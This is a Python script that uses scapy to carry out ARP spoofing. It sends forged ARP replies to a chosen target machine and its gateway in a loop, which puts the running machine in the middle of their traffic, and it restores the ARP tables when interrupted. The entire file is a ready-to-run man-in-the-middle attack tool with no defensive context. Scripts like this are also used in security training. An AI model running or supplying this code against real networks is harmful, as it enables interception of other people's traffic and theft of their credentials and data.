#!/usr/bin/env python

#todo(dugb) update/verify this for python3

import scapy.all as scapy
import argparse
import time
import sys


def parse_args():
  parser = argparse.ArgumentParser()
  parser.add_argument('-t', '--target', dest='target', help='IP address of the target machine.')
  parser.add_argument('-g', '--gateway', dest='gateway', help='IP address of the gateway.')
  options = parser.parse_args()
  if not options.target:
    parser.error('[-] Please specify a target ip address, see --help for more info.')
  elif not options.gateway:
    parser.error('[-] Please specify the gateway ip addres, see --help for more info.')  
  return options


def spoof(target_ip, spoof_ip):
  """Generates and sends the spoofing packet.
  
  Arguments:
      target_ip {string} -- Destination Ip addres, the target machine or router.
      spoof_ip {string} -- Source Ip address, we pretend the packet is sent from here.
  """
  target_mac = get_mac(target_ip)
  # By not specifying a hwsrc (source mac) in the packet scapy will use the
  # machines mac. This is what we want, so our spoof to work.
  packet = scapy.ARP(
    op=2,
    pdst=target_ip,
    hwdst=target_mac,
    psrc=spoof_ip)
  scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
  """Generates and sends a correction packet to correct the arp table of the target
    or the router.
  
  Arguments:
      destination_ip {string} -- Destination IP, target machine or router.
      source_ip {string} -- Source IP, who we pretend the packet is sent from.
  """
  destination_mac = get_mac(destination_ip)
  source_mac = get_mac(source_ip)
  packet = scapy.ARP(
    op=2,
    pdst=destination_ip,
    hwdst=destination_mac,
    psrc=source_ip,
    hwsrc=source_mac)
  scapy.send(packet, count=4, verbose=False)


def get_mac(ip):
  """Returns a MAC address for the given ip address.
  
  Arguments:
      ip {string} -- The ip address of the target we want a MAC.
  
  Returns:
      string -- MAC address
  """
  arp_request = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
  arp_request_broadcast = broadcast/arp_request
  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
  return answered_list[0][1].hwsrc


options = parse_args()
target_ip = options.target
gateway_ip = options.gateway
sent_packets_count = 0
try:
  while True:
    spoof(target_ip, gateway_ip)
    spoof(gateway_ip, target_ip)
    sent_packets_count += 2
    print("\r[+] Packets sent: " + str(sent_packets_count)),
    sys.stdout.flush()
    time.sleep(2)
except KeyboardInterrupt:
  print("\n[-] Detected CTRL-C...Reseting ARP Tables...Please wait.")
  restore(target_ip, gateway_ip)
  restore(gateway_ip, target_ip)